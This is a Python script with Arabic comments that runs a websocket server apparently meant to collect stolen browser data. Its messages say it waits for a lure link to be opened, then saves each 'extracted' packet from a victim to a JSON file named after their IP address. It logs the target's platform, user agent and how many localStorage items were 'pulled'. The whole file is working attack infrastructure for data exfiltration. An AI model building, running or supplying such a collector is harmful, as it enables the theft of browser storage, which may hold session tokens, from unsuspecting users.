import asyncio
import websockets
import json
import datetime

async def handler(websocket, path):
    client_ip = websocket.remote_address[0]
    print(f"\n[+] تم الاتصال بجهاز جديد تلقائياً من الأيبี: {client_ip}")
    
    async for message in websocket:
        try:
            data = json.loads(message)
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"extracted_data_{client_ip.replace('.', '_')}_{timestamp}.json"
            
            # حفظ الحزمة المستخرجة في ملف JSON منظم
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
                
            print(f"[✔] تم استلام الحزمة بنجاح وحفظها في الملف: {filename}")
            print(f"    - نوع النظام المستهدف: {data.get('platform')}")
            print(f"    - متصفح العميل: {data.get('userAgent')}")
            
            if 'localStorageContent' in data:
                print(f"    - تم سحب محتويات التخزين المحلي للمتصفح ({len(data['localStorageContent'])} عنصر).")
                
            # إرسال إقرار استلام تلقائي للعميل
            await websocket.send(json.dumps({"status": "received", "code": 200}))
            
        except Exception as e:
            print(f"[-] خطأ أثناء معالجة الحزمة الواردة: {e}")

async def main():
    async with websockets.serve(handler, "0.0.0.0", 8765):
        print("[*] الخادم التلقائي يعمل الآن بقوة على المنفذ 8765 بانتظار فتح الرابط...")
        await asyncio.Future()

if __name__ == '__main__':
    asyncio.run(main())
